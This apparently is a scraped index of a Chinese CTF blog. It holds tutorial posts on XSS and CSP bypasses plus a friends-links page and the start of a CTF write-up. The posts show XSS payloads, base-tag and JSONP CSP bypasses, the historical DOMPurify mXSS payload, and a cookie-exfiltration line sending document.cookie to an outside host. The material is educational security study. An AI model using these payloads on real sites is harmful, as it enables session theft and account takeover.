属性，huli师傅没有给出外链，可能需要后期自己补了 一个例子: \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; CSP test \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 如果要用到HTTP harder，可以写在中间件配置中，这里以nginx为例\nadd_header Content-Security-Policy \u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;; 其中，\u0026quot;script-src\u0026quot; 'none'就是当前页面不会执行js-script\nCSP的规则 #\rCSP的定义就是diretive+rule 最重要的一个叫做default-src，就是预设的规则，例如说没有设置script-src，那就会用default-src的内容，但要注意的是有几种指示不会fallback 到default-src，如base-uri或是form-action等等，完整列表可以看这边：The default-src Directive 常见的diretive有这些\nscript-src：管理JavaScript style-src：管理CSS font-src：管理字体 img-src：管理图片 connect-src：管理连线（fetch、XMLHttpRequest 以及WebSocket 等等） media-src：管理video 跟audio 等等 frame-src：管理frame 以及iframe 等等 base-uri：管理\u0026lt;base\u0026gt;的使用 form-action：管理表单的action frame-ancestors：管理页面可以被谁嵌入 report-uri：待会再讲 navigate-to：管理页面可以跳转到的地方 基本上常见的规则有以下几种：\n*，允许除了data:跟blob:还有filesystem:以外所有的URL 'none'，什么都不允许 'self'，只允许same-origin 的资源 https:，允许所有HTTPS 的资源 example.com，允许特定domain（HTTP 跟HTTPS 都可以） https://example.com，允许特定origin（只允许HTTPS） 细说script-src 的规则 #\r除了以上的规则以外，还有其他的规则也可以使用，例如设置完CSP之后，预设的是禁止inline-Script和eval进行执行的，其中inline-script包括：\n\u0026lt;script\u0026gt;标签里面直接放程式码（应该要用\u0026lt;script src\u0026gt;从外部引入） onclick这种写在HTML 里面的event handler javascript:伪协议 而eval就是类似于setTimeout这种可以把字符执行的命令。 对应这两个unline-src用来指定unsafe-inline，unsafe-eval则用来指定eval类的代码。 除了这些之外，还有'nonce-xxx'，意思是在后端产生一个随机字串，例如说a2b5zsa19c好了，那有带上nonce=a2b5zsa19c的script 标签就可以载入： \u0026lt;!-- 允許 --\u0026gt; \u0026lt;script nonce=a2b5zsa19c\u0026gt; alert(1) \u0026lt;/script\u0026gt; \u0026lt;!-- 不允許 --\u0026gt; \u0026lt;script\u0026gt; alert(1) \u0026lt;/script\u0026gt; 同样的我们也可以用hash值来做这种字串\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script \u0026#39;sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=\u0026#39;\u0026#34;\u0026gt; \u0026lt;!-- 其中这里一串的值是经过alert(1)的sha256+base64过来的 --\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;script nonce =\u0026#39;sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=\u0026#39;\u0026gt; alert(1) \u0026lt;/script\u0026gt; \u0026lt;!-- 不允許 --\u0026gt; \u0026lt;script\u0026gt;alert(2)\u0026lt;/script\u0026gt; \u0026lt;!-- 多一個空格也不允許，因為 hash 值不同 --\u0026gt; \u0026lt;script\u0026gt;alert(1) \u0026lt;/script\u0026gt; \u0026lt;!-- 允许 --\u0026gt; \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; 之后还有一个\u0026quot;script-dynamic\u0026quot;,动态的执行限制，看到这个脚本应该能明白\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;nonce-rjg103rj1298e\u0026#39; \u0026#39;strict-dynamic\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script nonce=rjg103rj1298e\u0026gt; const element = document.createElement(\u0026#39;script\u0026#39;) element.src = \u0026#39;https://example.com\u0026#39; document.body.appendChild(element) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 一个问题： 如果说你发现你的网站加载的script都来自https://unpkg.com,那么这样子写CSP合理吗\nContent-Security-Policy: script-src https://unpkg.com; Trusted Types #\r在这里，我看见了之前没有见过的新名词，因为他现在还在test阶段 这个东西是干嘛的呢，他会将未处理过的字符串进行抛出Exception，你可以这样子使用它,强制浏览器在插入HTML 时一定要先经过Trusted Types 的处理：\nContent-Security-Policy: require-trusted-types-for \u0026#39;script\u0026#39;; 当你正常的写一个程序的时候\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;require-trusted-types-for \u0026#39;script\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=content\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; document.querySelector(\u0026#34;#content\u0026#34;).innerHTML = \u0026#39;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 本身来看，并没有什么触发安全的问题，但是会抛出Exception\nThis document requires 'TrustedHTML' assignment. Uncaught TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'TrustedHTML' assignment.\r当强制启用Trusted Types 以后，就不能直接丢一个字串给innerHTML，而是要创立一个新的Trusted Types policy 来处理危险的HTML，用法是这样的：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;require-trusted-types-for \u0026#39;script\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=content\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // 新增一個 policy const sanitizePolicy = trustedTypes.createPolicy(\u0026#39;sanitizePolicy\u0026#39;, { // 決定你要怎麼做 sanitize/escape createHTML: (string) =\u0026gt; string .replace(/\u0026lt;/g, \u0026#34;\u0026amp;lt;\u0026#34;) .replace(/\u0026gt;/g, \u0026#39;\u0026amp;gt;\u0026#39;) }); // 回傳的 safeHtml 型態為 TrustedHTML，不是字串 const safeHtml = sanitizePolicy.createHTML(\u0026#39;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026#39;) document.querySelector(\u0026#34;#content\u0026#34;).innerHTML = safeHtml \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Bypass手法 #\rBypass CSP #\rUnsafe domain #\r如果你的网站上面有用到一些公开的CDN 平台来载入JS，像是unpkg.com之类的，有可能会直接把CSP 的规则设定成：script-src https://unpkg.com。 这个时候，因为CDN平台是公开的，如果有人上传了恶意的library，那么到你这个地方就可以直接使用，而针对这种情形，已经有人写了一个叫做csp-bypass的library 并且上传上去，来看个范例：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src https://unpkg.com/\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=userContent\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/react@16.7.0/umd/react.production.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;br csp=\u0026#34;alert(1)\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 所以第一个绕过方法就是看有没有这种写好的bypass library在公开的CDN里面\nBase绕过 #\r在设定CSP 时，一个常见的做法是利用nonce 来指定哪些script 可以载入，就算被攻击者注入HTML，在不知道nonce 的前提下他也无法执行脚本\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;none\u0026#39;; script-src \u0026#39;nonce-abc123\u0026#39;;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=userContent\u0026gt; \u0026lt;script src=\u0026#34;https://example.com/my.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script nonce=abc123 src=\u0026#34;app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这个时候我们一眼看上去没什么问题，因为这里用了nonce来限制script了，default-src也设置为none了，但是有一个标签他并不会被限制住就是\u0026lt;base\u0026gt;，例如\u0026lt;base href=\u0026quot;https://example.com/\u0026quot;\u0026gt;，他的意思就是，改变所有相对路径的参考，例如上面的app.js，如果写成这个样子\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;none\u0026#39;; script-src \u0026#39;nonce-abc123\u0026#39;;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=userContent\u0026gt; \u0026lt;base href=\u0026#34;https://example.com/\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script nonce=abc123 src=\u0026#34;app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 就相当于加载了https://example.com/app.js的文件，也就是如果我们把base改为远程地址，然后upload一个app.js，就可以直接执行代码了。 阻止这个绕过方式的解法是在CSP 中加上base-uri的规则，例如说用base-uri 'none'阻挡所有的base 标签。由于大多数网站应该都没有需要用到\u0026lt;base\u0026gt;的需求，可以大胆地加上这个指示。\nJSONP #\rJSONP 是一种能够跨来源取得资料的方式。 一般来说浏览器会阻止你跟非同源的网页互动，例如说在https://blog.huli.tw中执行：fetch('https://example.com')也就是没办法直接用fetch拿到别的网页的东西，但是有些标签类似于\u0026lt;img\u0026gt;这种本身就可以加载外部资源的标签并不会收到CORS的限制。 于是，出现了一种用API或者说是可以feedback的一种函数，例如https://example.com/api/users我们可以从这个url中得到这些信息\nsetUsers([\r{id: 1, name: \u0026#39;user01\u0026#39;},\r{id: 2, name: \u0026#39;user02\u0026#39;}\r]) 那么我们就可以这样子去拿到资料\n\u0026lt;script\u0026gt;\rfunction setUsers(users) {\rconsole.log(\u0026#39;Users from api:\u0026#39;, users)\r}\r\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#34;https://example.com/api/users\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 并且后面进化成https://example.com/api/users?callback=anyFunctionName这样子去调用\nanyFunctionName([\r{id: 1, name: \u0026#39;user01\u0026#39;},\r{id: 2, name: \u0026#39;user02\u0026#39;}\r]) 那么如果我们调用的方式是这样子https://example.com/api/users?callback=alert(1);console.log则拼接后就是\nalert(1);console.log([\r{id: 1, name: \u0026#39;user01\u0026#39;},\r{id: 2, name: \u0026#39;user02\u0026#39;}\r]) 小demo #\r\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src https://www.google.com https://www.gstatic.com\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=userContent\u0026gt; \u0026lt;script src=\u0026#34;https://example.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script async src=\u0026#34;https://www.google.com/recaptcha/api.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;button class=\u0026#34;g-recaptcha\u0026#34; data-sitekey=\u0026#34;6LfkWL0eAAAAAPMfrKJF6v6aI-idx30rKs55Lxpw\u0026#34; data-callback=\u0026#39;onSubmit\u0026#39;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Bypass:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src https://www.google.com https://www.gstatic.com\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=userContent\u0026gt; \u0026lt;script src=\u0026#34;https://example.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script async src=\u0026#34;https://www.google.com/recaptcha/api.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;button class=\u0026#34;g-recaptcha\u0026#34; data-sitekey=\u0026#34;6LfkWL0eAAAAAPMfrKJF6v6aI-idx30rKs55Lxpw\u0026#34; data-callback=\u0026#39;onSubmit\u0026#39;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 有一个叫做JSONBee的repository，里面有搜集很多知名网站的JSONP URL，虽然有些已经被拿掉了，但依然可以参考一下。 其中huli师傅提到了另外一个方法，但是极为复杂，这里不考虑写了\nopen redirect bypass #\r这个就很好理解，就是如果本身就含有一个重定向的位置，就可以绕过限制，这里举个例子\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src http://localhost:5555 https://www.google.com/a/b/c/d\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=userContent\u0026gt; \u0026lt;script src=\u0026#34;https://www.google.com/test\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://www.google.com/a/test\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://localhost:5555/301\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 很清楚的能看出来/test和/a/test路径会被CSP拦住，但是我们主要看到这里http://localhost:5555/301在server 端会重新导向到https://www.google.com/complete/search?client=chrome\u0026amp;q=123\u0026amp;jsonp=alert(1)//,这个方式CSP是允许的，所以就产生了绕过\n这里用sekai2024出的一道404绕过来简要概述\n@app.errorhandler(404) def page_not_found(error): path = request.path return f\u0026#34;{path} not found\u0026#34; 也就是他相对于将404页面变成了一个重定向的页面，我们就可以在里面写东西从而绕过限制，详情可以看Sekai2024-Tagless\n经过PRO的 #\rPRO(Relative Path Overwrite)，其实也是一种很容易能想到的方式 例如说CSP 允许的路径是https://example.com/scripts/react/，可以这样绕过：\n\u0026lt;script src=\u0026#34;https://example.com/scripts/react/..%2fangular%2fangular.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 浏览器最后就会载入https://example.com/scripts/angular/angular.js 应该很好理解，就不解释了\nOther #\r这一块主要写的就是如何外带数据\nwindow.location window.location = 'https://example.com?q=' + document.cookie WebRTC var pc = new RTCPeerConnection({ \u0026#34;iceServers\u0026#34;:[ {\u0026#34;urls\u0026#34;:[ \u0026#34;turn:74.125.140.127:19305?transport=udp\u0026#34; ],\u0026#34;username\u0026#34;:\u0026#34;_all_your_data_belongs_to_us\u0026#34;, \u0026#34;credential\u0026#34;:\u0026#34;.\u0026#34; }] }); pc.createOffer().then((sdp)=\u0026gt;pc.setLocalDescription(sdp)); DNS prefetch：\u0026lt;link rel=\u0026quot;dns-prefetch\u0026quot; href=\u0026quot;https://data.example.com\u0026quot;\u0026gt; mutation based XSS(MXSS) #\r有一种常拿来针对sanitizer 的攻击方式，叫做mutation based XSS，也被称做mutation XSS 或是简称mXSS。 所以在此之前，我们要了解一下sanitizer是怎么运作的\nSanitizer运作方式 #\r这是一个即食方法“\nconst inputHtml = \u0026#39;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026#39; const safeHtml = sanitizer.sanitize(inputHtml) document.body.innerHTML = safeHtml 具体的运作过程：\n把inputHtml解析成DOM tree（tree tree的） 删除不合法的node 以及attribute 把DOM tree 序列化（serialize）成字串 返回 Reason and Exploit #\r我们看到这样子的一个例子\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=content\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; content.innerHTML = \u0026#39;\u0026lt;table\u0026gt;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;/table\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 可以看到他竟然把h1从table里面跳出来了！会有这样的结果是因为浏览器根据HTML 规格，判定\u0026lt;h1\u0026gt;不该在\u0026lt;table\u0026gt;中，因此就很贴心地把它拿了出来。 而这种行为，就叫做mutation，所以，用这个方式构成的XSS叫做mXSS\n那么下一个例子就是：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=content\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; content.innerHTML = \u0026#39;\u0026lt;svg\u0026gt;\u0026lt;p\u0026gt;hello\u0026lt;/svg\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 可以看到这次他只是加上了一个\u0026lt;/p\u0026gt; 如果是这样子呢？\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=content\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; content.innerHTML = \u0026#39;\u0026lt;svg\u0026gt;\u0026lt;p\u0026gt;\u0026lt;/p\u0026gt;hello\u0026lt;/svg\u0026gt;\u0026#39; console.log(content.innerHTML) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 在现在的浏览器中似乎优化了这个sanitizer，在我本地用firefox运行是这样子的 他把这个hello单独拿出来了，但是都在这个svg标签里面，但是huli师傅里面的是 这个地方先保留质疑，也许有别的标签可以跳出来，这里huli师傅只用了svg这个，利用这个特性，我们可以玩一些好玩的东西\n神奇的style #\r为什么会说这个东西神奇呢？\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; \u0026lt;a id=\u0026#34;test\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 通过这个我们可以看到a标签竟然变成了一个文字！ 那么我们如果再最外面套上一层\u0026lt;svg\u0026gt;标签呢？\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;svg\u0026gt; \u0026lt;style\u0026gt; \u0026lt;a id=\u0026#34;test\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 他就会变回原来的a标签了 所以我们就可以构造\n\u0026lt;style\u0026gt;\r\u0026lt;a id=\u0026#34;\u0026lt;/style\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;\r\u0026lt;/style\u0026gt; 可以看到他真的执行了！OG们太强了，此时的解析为： 他把img标签单独拿出来了，从而变成了可执行的xss\n在2019 年9 月19 号，DOMPurify 释出了2.0.1 版本，目的是修正一个利用mutation 来绕过检查的mXSS 漏洞，当时有问题的完整payload 是这样：\n\u0026lt;svg\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;style\u0026gt;\u0026lt;a id=\u0026#34;\u0026lt;/style\u0026gt;\u0026lt;img src=1 onerror=alert(1)\u0026gt;\u0026#34;\u0026gt; 而在TPCTF2025中，也出现了这样子的题目 TPCTF2025 Universal XSS #\r这种XSS被huli师傅称为是最强XSS，他表示的就是在浏览器或者内建的Plugin中出现的漏洞，可以达到的影响是：「无论在哪个网站都可以执行程式码」\n这里就只放出来一些链接，因为要分析的话确实我能力还不够呜呜呜 2006 年的Firefox 的Adobe Acrobat Subverting Ajax 2012 年的Android Chrome Issue 144813: Security: UXSS via com.android.browser.application_id Intent extra 2019 年Chromium 透过portal 的 USXSSIssue 962500: Security: Security: Same Origin Policy bypass and local file disclosure via portal element\n总结 #\r之前从来没这么认真学过xss，现在一看，XSS真的是一个艺术般的存在，真的非常优美，祝我有一天能挖到hackone里的xss赏金。 一些参考： https://baozongwi.xyz/p/tpctf2025/#safe-layout-revenge https://aszx87410.github.io/beyond-xss/ch2/xss-defense-sanitization/ https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization\n","date":"22 August 2025","externalUrl":null,"permalink":"/posts/%E6%8E%A2%E7%B4%A2xss%E5%AE%89%E5%85%A8day%E4%BA%8C/","section":"Posts","summary":"\u003cp\u003e首发于奇安信攻防社区：https://forum.butian.net/share/4535\u003c/p\u003e","title":"探索前端安全-XSS(二)","type":"posts"},{"content":"前言 #\r以前一直没有把XSS当做一个很重要的漏洞去学习，也许是国内一直不大重视XSS（犹记得初中高中那段时间的src基本上都不收）至少在我的印象里是这样子，但是作为一个CTFer，国际赛上更多出现的是nodejs，xss等前端问题的题目，于是为了能适应国外xss的赛题，又或者是想精修一下自己的前端，于是系统的学习一下。\n一些简单的叙述 #\r一个小小的XSS #\r对于XSS的简介，我就不详细概述了，我也不会想再捋一遍XSS的前世（毕竟我历史不好bushi） 那么我们来举一个最最简单的XSS的例子\n\u0026lt;?php echo \u0026#34;Hello\u0026#34;. $_GET[\u0026#39;name\u0026#39;]; ?\u0026gt; 如果正常的去传参，浏览器也只会解析为\nHello Delete 传入\u0026lt;scrpit\u0026gt;alert(hacked by D05TL3)\u0026lt;/script\u0026gt; 自然而然的就拼接为\nHello \u0026lt;scrpit\u0026gt;alert(hacked by D05TL3)\u0026lt;/script\u0026gt; payload角度 #\r对于这个地方，引用huli师傅的看法，我们需要考虑到两个角度\nAngle1-内容是如何被放到页面上的 #\r这里huli师傅给出了另外一个例子\n\u0026lt;div\u0026gt; HEllo,\u0026lt;span id = \u0026#34;name\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; const qs = new URLSearchParams(window.location.search) const name = qs.get(\u0026#34;name\u0026#34;) document.querySelector(\u0026#39;#name\u0026#39;).innerHTML = name \u0026lt;/script\u0026gt; 同样的这里一眼就能看出来：name=\u0026lt;scrpit\u0026gt;alert(hacked by D05TL3)\u0026lt;/script\u0026gt;即可，但是这里的script不会在innerHTML插入中被调用。 所以就是我们在研究xss的时候也要看一下xss是如何触发，是怎么放上去又是怎么被解析的。\nAngle2-Payload有没有被储存 #\r顾名思义，我们前面的例子都是没有被存储下来的，这一点其实我认为不用太过于纠结有没有存储到，因为在CTF中，大部分很少会给你存储型的XSS，除了环境确实是这么出的，但是我也不否认在真实的攻击场景中需要这种可持续性的漏洞存在，也可以说是worm XSS，这里不过多赘述\n起步，从第一个XSS开始 #\r常见的触发方式 #\rJS event handler #\r其实这个地方也可以说是关于对JS event handler的使用 对于前面的一个例子\n\u0026lt;div\u0026gt; HEllo,\u0026lt;span id = \u0026#34;name\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; const qs = new URLSearchParams(window.location.search) const name = qs.get(\u0026#34;name\u0026#34;) document.querySelector(\u0026#39;#name\u0026#39;).innerHTML = name \u0026lt;/script\u0026gt; 这里没办法用\u0026lt;script\u0026gt;来xss，所以这个地方就可以用到我们的event handler，举个例子\u0026lt;img src=x onerror=\u0026quot;alert(1)\u0026quot;\u0026gt;。 所以这里可以列举一些常见的event handler\nonerror onload onfocus onblur onanimationend onclick onmouseenter 然后如果想了解更多payload： https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 然后这里huli师傅也提到了一点，就是可以不需要用到'和\u0026quot;，就像这样 \u0026lt;svg/onload=alert(0)\u0026gt; ~~自问自答环节\nbut这个地方如果用不了event handler呢？ solved:我们可以使用iframe+srcdoc（犹记得似乎在n1junior2025出现过）\n属性注入(EZ bypass) #\rdemo\n\u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; const qs = new URLSearchParams(window.location.search) const clazz = qs.get(\u0026#39;clazz\u0026#39;) document.querySelector(\u0026#39;#content\u0026#39;).innerHTML = ` \u0026lt;div class=\u0026#34;${clazz}\u0026#34;\u0026gt; Demo \u0026lt;/div\u0026gt; ` \u0026lt;/script\u0026gt; 这个时候我们就可以闭合掉这个尖括号 \u0026quot;\u0026gt;\u0026lt;img src=x onerror=alert(1) 方式二:\u0026quot; tabindex=1 onfocus=\u0026quot;alert(1)\u0026quot; x=\u0026quot;，我们可以选择不闭合，直接往里面加入更多的属性，并且包含这个event handler\njavascript:伪协议 #\r使用场景 #\ra标签 \u0026lt;a href=javascript:alert(1)\u0026gt;Link\u0026lt;/a\u0026gt; iframe标签 \u0026lt;iframe src=javascript:alert(1)\u0026gt;\u0026lt;/iframe\u0026gt; form标签 \u0026lt;form action = javascript:alert(1)\u0026gt; \u0026lt;button\u0026gt;submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;form id=f2\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;button form=f2 formaction=javascript:alert(2)\u0026gt;submit\u0026lt;/button\u0026gt; 一个小小的demo #\r\u0026lt;iframe src=\u0026#34;\u0026lt;?= $youtube_url ?\u0026gt;\u0026#34; width=\u0026#34;500\u0026#34; height=\u0026#34;300\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 可以看到这里有一个地方可以插入网址，但是这里可以把javascript:alert(1)当做网址输入，同样的写法在react和Vue里都可以实现 react:\nimport React from \u0026#39;react\u0026#39;; export function App(props) { // 假設底下的資料是來自於使用者 const href = \u0026#39;javascript:alert(1)\u0026#39; return ( \u0026lt;a href={href}\u0026gt;click me\u0026lt;/a\u0026gt; ); } Vue:\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const link = ref(\u0026#39;javascript:alert(1)\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;a :href=\u0026#34;link\u0026#34;\u0026gt;click me\u0026lt;/a\u0026gt; \u0026lt;/template\u0026gt; 除了简单的iframe中，我们实现页面跳转也可以使用这个伪协议，类似于这样\nconst searchParams = new URLSearchParams(location.search) window.location = searchParams.get(\u0026#39;redirect\u0026#39;) 问题在于window.location他的值也可以是伪协议\n在waf上面 #\r在huli师傅的叙述中，似乎很难对伪协议做一个过滤，因为他的使用范围非常的广，比如你去正则JavaScript:，但是html可以用实体编码绕过，Like n1junior的display一样，总的来说，如果要防御伪协议的出现， 建议是加上target=\u0026quot;_blank\u0026quot;这个属性，或者用上一些library\n最后 #\rhuli师傅留下了一个题目，先思考一下\n// 這是一個可以在 profile 頁面嵌入自己 YouTube 影片的功能 const url = \u0026#39;value from user\u0026#39; // 確保是 YouTube 影片網址的開頭 if (url.startsWith(\u0026#39;https://www.youtube.com/watch\u0026#39;)) { document.querySelector(\u0026#39;iframe\u0026#39;).src = url } 这里有什么安全问题？\n","date":"19 August 2025","externalUrl":null,"permalink":"/posts/%E6%8E%A2%E7%B4%A2xss%E5%AE%89%E5%85%A8day%E4%B8%80/","section":"Posts","summary":"","title":"探索前端安全-XSS(一)","type":"posts"},{"content":"\r我的朋友们 #\rchu0’s blog - @NK-WEB 涂寐\u0026rsquo;s blog - 涂寐师傅的博客 小花\u0026rsquo;s blog - @NAN-pwn IX221’s blog - @VN-RE Harder’s blog - @n03tAcK-web unknown’s blog - @VN-web-队长 aecous’s blog - @VN-JAVA神 june’s blog - 实战、SRC（非常强！）✌ Crypto0’s blog - 一位密码✌ Gr%1m’s blog - 密码✌小明 Kicky_Mu’s blog - Rotten 密码✌ zyc2018’s blog - NAN web✌ lazyforever\u0026rsquo;s blog - NAN-web神 ththai\u0026rsquo;s blog - 深大web✌ liangmo\u0026rsquo;s blog - web高高手，实战✌ kengwang\u0026rsquo;s blog - N1junior的web神 LilRan\u0026rsquo;s blog - 今日启程，无畏向前 baozongwi - @SU-bao神 AnA - 一个努力做全栈开发的广财 er~💻 ","date":"18 August 2025","externalUrl":null,"permalink":"/friends/","section":"友链","summary":"","title":"友链","type":"friends"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/categories/ctf/","section":"Categories","summary":"","title":"CTF","type":"categories"},{"content":"Hackchan #\rHackchan is your friendly neighborhood grocery store, with an exclusive loyalty program where points can be redeemed for amazing rewards. The system is said to be bulletproof, but there are whispers of a 